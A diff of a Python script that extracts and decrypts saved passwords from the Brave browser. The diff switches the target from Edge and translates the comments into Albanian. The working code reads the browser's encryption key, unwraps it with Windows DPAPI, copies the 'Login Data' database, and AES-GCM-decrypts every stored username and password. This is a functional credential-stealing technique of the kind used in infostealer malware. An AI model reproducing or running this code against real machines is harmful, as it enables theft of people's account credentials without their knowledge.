@@ -10,34 +10,28 @@ from datetime import timezone, datetime, timedelta
 
 
 def chrome_date_and_time(chrome_data):
-    # Chrome_data format is 'year-month-date
-    # hr:mins:seconds.milliseconds
-    # This will return datetime.datetime Object
+    # Kjo do te kthej nje objekt datetime.datetime ne menyr qe ta marrim kohen qe kur ka ndodhur ruajtja e fjalkalimit
     return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
 
 
 def fetching_encryption_key():
-    # Local_computer_directory_path will look
-    # like this below
-    # C: => Users => <Your_Name> => AppData =>
-    # Local => Google => Chrome => User Data =>
-    # Local State
+    # Pathi qe eshte ne kompjuterin e shfrytzuesit
     local_computer_directory_path = os.path.join(
-        os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge",
+        os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser",
         "User Data", "Local State")
 
     with open(local_computer_directory_path, "r", encoding="utf-8") as f:
         local_state_data = f.read()
         local_state_data = json.loads(local_state_data)
 
-    # decoding the encryption key using base64
+    # Dekodimi i qelsit enkriptues duke perdorur base64
     encryption_key = base64.b64decode(
         local_state_data["os_crypt"]["encrypted_key"])
 
-    # remove Windows Data Protection API (DPAPI) str
+    # Largimi i "Windows Data Protection API" ose "DPAPI"
     encryption_key = encryption_key[5:]
 
-    # return decrypted key
+    # Kthen qelsin e dekriptuar
     return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
 
 
@@ -46,10 +40,10 @@ def password_decryption(password, encryption_key):
         iv = password[3:15]
         password = password[15:]
 
-        # generate cipher
+        # Gjeneron shifren
         cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
 
-        # decrypt password
+        # Dekripton fjalkalimin
         return cipher.decrypt(password)[:-16].decode()
     except:
 
@@ -62,20 +56,20 @@ def password_decryption(password, encryption_key):
 def main():
     key = fetching_encryption_key()
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                           "Microsoft", "Edge", "User Data", "Default", "Login Data")
+                           "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
     filename = "ChromePasswords.db"
     shutil.copyfile(db_path, filename)
 
-    # connecting to the database
+    # Lidhje ne databaz
     db = sqlite3.connect(filename)
     cursor = db.cursor()
 
-    # 'logins' table has the data
+    # 'logins' tabela i ka te dhenat
     cursor.execute(
         "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
         "order by date_last_used")
 
-    # iterate over all rows
+    # Iterimi ne te gjith rreshtat
     for row in cursor.fetchall():
         main_url = row[0]
         login_page_url = row[1]
@@ -103,9 +97,7 @@ def main():
     db.close()
 
     try:
-
-        # trying to remove the copied db file as
-        # well from local computer
+        # Provon te largon kopjen e filit te bazes se dhenave nga kompjuteri
         os.remove(filename)
     except:
         pass
